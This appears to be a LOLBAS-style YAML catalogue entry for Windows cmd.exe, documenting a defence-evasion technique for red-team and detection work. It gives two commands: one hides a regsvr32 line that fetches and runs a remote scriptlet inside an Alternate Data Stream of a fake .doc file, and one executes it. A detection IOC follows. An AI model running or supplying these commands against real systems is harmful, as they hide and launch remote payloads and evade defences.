---
Name: Cmd.exe
Description: The command-line interpreter in Windows
Author: 'Ye Yint Min Thu Htut'
Created: 2019-06-26
Commands:
  - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
    Description: Add content to an Alternate Data Stream (ADS).
    Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
    Category: ADS
    Privileges: User
    MitreID: T1059.003
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: cmd.exe - < fakefile.doc:payload.bat
    Description: Execute payload.bat stored in an Alternate Data Stream (ADS).
    Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
    Category: ADS
    Privileges: User
    MitreID: T1059.003
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\cmd.exe
  - Path: C:\Windows\SysWOW64\cmd.exe
Code_Sample:
- Code:
Detection:
 - IOC: cmd.exe executing files from alternate data streams.
Resources:
  - Link: https://twitter.com/yeyint_mth/status/1143824979139579904
Acknowledgement:
  - Person: r0lan
    Handle: '@yeyint_mth'
---
